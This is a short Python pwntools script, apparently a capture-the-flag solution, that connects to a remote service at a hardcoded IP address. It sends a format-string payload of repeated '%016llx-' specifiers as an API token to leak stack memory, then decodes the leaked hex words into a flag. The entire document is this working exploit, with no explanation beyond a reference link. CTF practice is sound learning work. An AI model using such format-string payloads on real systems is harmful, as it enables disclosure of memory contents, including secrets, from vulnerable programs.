from pwn import *

# reference: https://blog.csdn.net/qq_33976344/article/details/117961293

r = remote("124.16.75.117", 51002)

r.recvuntil("2) View my portfolio\n")
r.sendline("1")
r.recvuntil("What is your API token?\n")
r.sendline("%016llx-" * 80)  # long int
r.recvuntil("Buying stonks with token:\n")


leak = r.recvline().decode("utf-8")
print(leak)
leak = leak.split("-")
print(leak)

flag = ""
for each in leak:
    try:
        each_code = bytearray.fromhex(each).decode()[::-1]
        flag += each_code
    except:
        continue

print()
print("FLAG:")
print(flag)
